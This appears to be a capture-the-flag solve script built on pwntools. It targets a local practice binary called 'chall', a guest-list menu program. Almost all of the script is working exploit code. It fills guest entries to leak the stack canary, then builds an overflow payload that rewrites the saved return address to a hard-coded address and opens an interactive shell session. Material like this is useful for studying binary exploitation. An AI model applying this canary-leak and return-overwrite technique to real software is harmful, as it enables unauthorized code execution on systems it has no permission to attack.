#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11101 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 11102)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *displayGuestList
b *0x0000000000401ad6
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def check_in(name,number):
    io.sendlineafter(": ","1")
    io.sendlineafter(": ",str(name))
    io.sendlineafter(": ",str(number))

def edit_guest(idx,name,number):
    io.sendlineafter(": ","4")
    io.sendlineafter(": ",str(idx))
    io.sendlineafter(": ",str(name))
    io.sendlineafter(": ",str(number))

for i in range(8):
    check_in("a",1)
check_in("a",2)
check_in("a"*40,10)

io.sendlineafter(": ","2")
io.recvuntil("Guest 10: " + 'a'*40 + "\n")
canary = "\x00"+io.recv(7)
print hex(u64(canary))

p = 'a'*40
p += canary
p += p64(0) # bss
p += p64(0x0000000000401263)
edit_guest(10,p,1)
io.sendlineafter(": ","5")
io.interactive()

